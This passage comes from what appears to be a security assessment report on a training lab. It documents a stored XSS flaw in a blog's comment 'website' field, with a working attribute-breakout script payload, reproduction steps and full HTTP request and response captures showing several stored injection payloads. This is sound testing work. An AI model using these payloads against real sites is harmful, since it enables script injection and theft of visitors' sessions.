                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [xss-stored] Stored XSS via comment "website" field breaks out of anchor href on blog post pages

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

The comment endpoint (POST /post/comment) stores the "website" field and renders it, unescaped, into the href attribute of the comment author's anchor (<a href="WEBSITE">name</a>) on the blog post page (GET /post?postId=N). A website value of http://verdictz"><script>alert('VERDICTSTOREDZ9')</script> closes the href and the <a> tag and injects a live <script> element that executes in the browser of anyone who views that post — a persistent, unauthenticated stored XSS enabling session-cookie theft. The live post-page DOM parses the value as a discrete anchor followed by a script node (verified in-browser), and several earlier test payloads (alert(2), alert(document.domain), alert('vdxpwn9021')) are also stored, confirming the sink is durable and reproducible. The form uses a per-request CSRF token, threaded here by submitting through the browser. Distinct from the home-page cache-poisoning finding f-002 (different endpoint, different sink, genuine server-side persistence). NB: /post responses are themselves served through a query-unkeyed cache, so uncached confirmation uses the pre-store baseline as the negative control.

**Reproduction**

```
1. Negative control — GET /post?postId=1 before storing: 200, 13851 bytes, no VERDICTSTOREDZ9 (ev-mr824qe6-68).
2. Store — load /post?postId=1, fill the comment form and set website = http://verdictz"><script>alert('VERDICTSTOREDZ9')</script>, submit (browser threads the csrf token) → 302 /post/comment/confirmation?postId=1.
3. Render-back — GET /post?postId=1 (origin render): 200, 14337 bytes, the website value is emitted into the author-anchor href unescaped so the token VERDICTSTOREDZ9 appears inside an injected <script>alert('VERDICTSTOREDZ9')</script> that the browser executes (ev-mr82e6xi-6k and ev-mr82eb71-6l — two stable positives).
The identical URL lacks the token before the store (step 1) and contains the executing script after (step 3), proving persistence of the injected script.
```

**Evidence**

- Evidence `ev-mr824qe6-68` — `artifacts/_/ev-mr824qe6-68/`

Request:

```http
GET /post?postId=1 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
content-length: 13851
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post?postId=1'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/39.jpg">
                    <h1>The Art Of Communication</h1>
                    <p><span id=blog-author>Roger That</span> | 16 June 2026</p>
                    <hr>
                    <p>I&apos;m a bit of a Francophile, so when I travel to France I love to speak their language. I&apos;m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of whom speak French; in fact, it&apos;s almost as though my partner refuses to speak it, he thinks we can all get by on sign language and mime.</p>
                    <p>Neither of my companions understand why I would continue to speak French when the other person is speaking English. I try to explain they want to practice their English in the same way. I speak French and they speak English, and to be honest I probably wouldn&apos;t understand a lot of what they are saying in French, as it is too fast for my comprehension.</p>
                    <p>Asking for directions isn&apos;t too hard, following the answer is, even if you do know your &apos;la gauche&apos; from your &apos;droite&apos;. The easiest option would be to hand them a map and point to your destination, or ask &apos;where am I?&apos; And get them to point at the map. But I think that&apos;s just plain rude, I like to start with a nice salutation and take it from there, even if it doesn&apos;t get me to where I want to go, just smile and wave, smile and wave. In the meantime Mr. Cynical is doing an elaborate dance, arms flailing, finger pointing with the odd preposition thrown in for good measure. It strongly resembles a game of Charades. Then there&apos;s a wave of the hand and off we trot as he says he knows where to go now. So frustrating!</p>
                    <p>I&apos;ve discovered as my memory is starting to fail me I use my hands much more when talking, and trying to remember words. This too becomes a game of charades, and quite a tricky way to conduct a conversation. It can also be quite dangerous, I have often knocked drinks over people as I become excited and animated trying to think of a word which suddenly comes to me. There has even been the odd punch in the face and poke in the eye. I have become a serial mover of potential targets, things not people. I rearrange everything on the table to keep my companions in a safe zone, then try to sit far enough away they won&apos;t be on the receiving end of my out of control limbs.</p>
                    <p>It is possible to get by on mime and gesticulation, I&apos;ve trained my dog using sign language, mostly because she won&apos;t listen to a thing I ask her to do, so in my frustration I started &apos;acting&apos; out, and things just snowballed from there. If you&apos;ve ever watched Mr. Bean then you&apos;ll know what I&apos;m talking about.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <div class=is-warning>Comments may take some time to appear while being moderated</div>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grace O&apos;Gawd | 21 June 2026
                        </p>
                        <p>This could be made into a book.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grant Anuncle | 30 June 2026
                        </p>
                        <p>My hamster just died and I&apos;m really sad. Follow me on www.funnythings.com.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Allyoucan Pete | 30 June 2026
                        </p>
                        <p>Can we meet and talk about a collaboration?</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://test.com&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;">VXSSNAME&lt;b&gt;bold&lt;/b&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://x&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;">verdictname</a> | 05 July 2026
                        </p>
                        <p>verdicttest comment body</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://vdx&quot;&gt;&lt;script&gt;alert(&apos;vdxpwn9021&apos;)&lt;/script&gt;">vdxtester</a> | 05 July 2026
                        </p>
                        <p>Great article vdxmarker9021</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://plainok.example">&quot;&gt;&lt;svg onload=alert(&apos;vdxNAME888&apos;)&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;img src=x onerror=alert(&apos;vdxCMT888&apos;)&gt;</p>
                        <p></p>
                    </section>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="UP3tovMkCyZJJYNIaigPsLBf539681t5">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82e6xi-6k` — `artifacts/_/ev-mr82e6xi-6k/`

Request:

```http
GET /post?postId=1&vcb=alpha7719 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
content-length: 14337
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post?postId=1&vcb=alpha7719'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/39.jpg">
                    <h1>The Art Of Communication</h1>
                    <p><span id=blog-author>Roger That</span> | 16 June 2026</p>
                    <hr>
                    <p>I&apos;m a bit of a Francophile, so when I travel to France I love to speak their language. I&apos;m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of whom speak French; in fact, it&apos;s almost as though my partner refuses to speak it, he thinks we can all get by on sign language and mime.</p>
                    <p>Neither of my companions understand why I would continue to speak French when the other person is speaking English. I try to explain they want to practice their English in the same way. I speak French and they speak English, and to be honest I probably wouldn&apos;t understand a lot of what they are saying in French, as it is too fast for my comprehension.</p>
                    <p>Asking for directions isn&apos;t too hard, following the answer is, even if you do know your &apos;la gauche&apos; from your &apos;droite&apos;. The easiest option would be to hand them a map and point to your destination, or ask &apos;where am I?&apos; And get them to point at the map. But I think that&apos;s just plain rude, I like to start with a nice salutation and take it from there, even if it doesn&apos;t get me to where I want to go, just smile and wave, smile and wave. In the meantime Mr. Cynical is doing an elaborate dance, arms flailing, finger pointing with the odd preposition thrown in for good measure. It strongly resembles a game of Charades. Then there&apos;s a wave of the hand and off we trot as he says he knows where to go now. So frustrating!</p>
                    <p>I&apos;ve discovered as my memory is starting to fail me I use my hands much more when talking, and trying to remember words. This too becomes a game of charades, and quite a tricky way to conduct a conversation. It can also be quite dangerous, I have often knocked drinks over people as I become excited and animated trying to think of a word which suddenly comes to me. There has even been the odd punch in the face and poke in the eye. I have become a serial mover of potential targets, things not people. I rearrange everything on the table to keep my companions in a safe zone, then try to sit far enough away they won&apos;t be on the receiving end of my out of control limbs.</p>
                    <p>It is possible to get by on mime and gesticulation, I&apos;ve trained my dog using sign language, mostly because she won&apos;t listen to a thing I ask her to do, so in my frustration I started &apos;acting&apos; out, and things just snowballed from there. If you&apos;ve ever watched Mr. Bean then you&apos;ll know what I&apos;m talking about.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <div class=is-warning>Comments may take some time to appear while being moderated</div>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grace O&apos;Gawd | 21 June 2026
                        </p>
                        <p>This could be made into a book.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Grant Anuncle | 30 June 2026
                        </p>
                        <p>My hamster just died and I&apos;m really sad. Follow me on www.funnythings.com.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Allyoucan Pete | 30 June 2026
                        </p>
                        <p>Can we meet and talk about a collaboration?</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://test.com&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;">VXSSNAME&lt;b&gt;bold&lt;/b&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://x&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;">verdictname</a> | 05 July 2026
                        </p>
                        <p>verdicttest comment body</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://vdx&quot;&gt;&lt;script&gt;alert(&apos;vdxpwn9021&apos;)&lt;/script&gt;">vdxtester</a> | 05 July 2026
                        </p>
                        <p>Great article vdxmarker9021</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://plainok.example">&quot;&gt;&lt;svg onload=alert(&apos;vdxNAME888&apos;)&gt;</a> | 05 July 2026
                        </p>
                        <p>&lt;img src=x onerror=alert(&apos;vdxCMT888&apos;)&gt;</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://verdictz&quot;&gt;&lt;script&gt;alert(&apos;VERDICTSTOREDZ9&apos;)&lt;/script&gt;">vz9</a> | 05 July 2026
                        </p>
                        <p>verdict scenario check vz9</p>
                        <p></p>
                    </section>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="0SIKJ6BBQNyG8e6Ugq71XiHvV4xnTu9d">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82eb71-6l` — `artifacts/_/ev-mr82eb71-6l/`

Request:

```http
GET /post?postId=1&vcb=bravo8823 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 6
cache-control: max-age=35
content-length: 14337
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post?postId=1&vcb=alpha7719'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
